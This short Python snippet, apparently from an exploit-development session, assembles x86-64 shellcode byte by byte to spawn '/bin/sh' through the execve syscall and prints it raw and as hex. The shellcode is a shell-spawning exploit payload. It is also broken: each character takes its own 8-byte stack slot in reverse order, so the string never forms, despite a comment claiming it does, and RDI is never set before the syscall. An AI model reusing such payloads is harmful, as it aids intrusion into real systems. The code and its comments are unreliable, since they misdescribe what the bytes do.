# Let me push in the correct order:
shellcode = b""
shellcode += b"\x31\xc0"      # xor eax, eax (2)
shellcode += b"\x50"          # push rax (1) - null terminator

# Push in correct order: "/bin/sh"
shellcode += b"\xb0\x2f"      # mov al, 0x2f (2) - '/'
shellcode += b"\x50"          # push rax (1)

shellcode += b"\xb0\x62"      # mov al, 0x62 (2) - 'b'
shellcode += b"\x50"          # push rax (1)

shellcode += b"\xb0\x69"      # mov al, 0x69 (2) - 'i'  
shellcode += b"\x50"          # push rax (1)

shellcode += b"\xb0\x6e"      # mov al, 0x6e (2) - 'n'
shellcode += b"\x50"          # push rax (1)

shellcode += b"\xb0\x2f"      # mov al, 0x2f (2) - '/'
shellcode += b"\x50"          # push rax (1)

shellcode += b"\xb0\x73"      # mov al, 0x73 (2) - 's'
shellcode += b"\x50"          # push rax (1)

shellcode += b"\xb0\x68"      # mov al, 0x68 (2) - 'h'
shellcode += b"\x50"          # push rax (1)

# Now RSP points to "/bin/sh" string
# Add your existing code:
shellcode += b"\x6a\x3b"      # push 0x3b (2)
shellcode += b"\x58"          # pop rax (1) 
shellcode += b"\x31\xf6"      # xor esi, esi (2)
shellcode += b"\x31\xd2"      # xor edx, edx (2)
shellcode += b"\x0f\x05"      # syscall (2)

print("Full shellcode:", shellcode)
print("Full shellcode:", shellcode.hex())